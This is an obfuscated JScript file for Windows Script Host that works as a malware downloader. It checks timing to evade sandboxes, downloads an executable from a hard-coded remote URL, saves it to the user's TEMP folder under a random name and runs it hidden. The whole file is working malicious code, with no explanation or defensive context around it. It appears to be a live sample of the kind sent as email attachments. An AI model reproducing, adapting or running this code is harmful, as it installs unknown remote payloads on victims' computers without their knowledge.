var _E = false;
var _WX = "CreateObject";
var _C = function _U() {return WScript[_WX]("WScript"+".Shell");}(), _X = 11;
var _B = "MSXML2.XMLHTTP";
var _QO = 2123213;
var _ZS = 0;
function _M0(_GY){_C["Run"](_GY, _ZS, _ZS);};
function _M(){return _B + "";};
function _QU0(_C0, _GH){_ZS = _ZS * 1; return _C0 - _GH;};
function _QU(){return _WX;};
/*@cc_on
  @if (@_win32 || @_win64)
    _E = true;
  @end
@*/
if (_E)
{
var _J = "";
function _G(){return 22;};
var _D0 = 0; var _W = 0;
function _A()
{
var _EK = new this["Date"]();
var _LC = _EK["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _EK = new this["Date"]();
var _YY = _EK["getUTCMilliseconds"]();
WScript["Sleep"](_G());
var _EK = new this["Date"]();
var _WU = _EK["getUTCMilliseconds"]();
var _D0 = "_H";
_D0 = _QU0(_YY, _LC);
var _W = "_XL";
_W = _QU0(_WU, _YY);
_J = "open";
return _QU0(_D0, _W);
}
var _F = false;
var _P0 = false;
for (var _T = _ZS; _T < _G() * 1; _T++){if (_A() != _ZS){
_F = true; 
_W = "31" + 11 * _D0 + _W; 
_P0 = true; 
break;
}}
function _HN() {return ((_F == true) && (_F == _P0)) ? 1 : _ZS;};
if (_F && _HN() && _P0){
function _RQ() {return _C["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "qavBhoXHhKJ.ex" + "e";};
 _XO = _M();
 _ZF = WScript[_WX](_XO);
 var _RY = 1;
 while (_RY){
try {
	if (_RY == 1)
	{
		_ZF[_J]("GET", "http://hollandfoodexchange.com/d7jsa", false);
		_ZF["send"]();
		_KR = "Sleep";
	}
	WScript[_KR](_G() + 120); 
	if (_ZF["readystate"] < 2 * 2) continue;
	_RY = _ZS;
	function _Y(_UN) {var _P = (1, 2, 3, 4, 5, _UN); return _P;};
	_M1 = WScript[_QU()]("ADODB.Stream");
	_XO = _M1;
	_XO[_J]();
	_XO["type"] = _Y(1);
	_XO["write"](_ZF["ResponseBody"]);
	_M1["position"] = _Y(_ZS);
	_XO["Save" + "ToFile"](_RQ(), 2);
	_M1["cl"+"ose"]();
	_D = _RQ();
	_M0(_D);
} catch(_QV){};
}
}
}

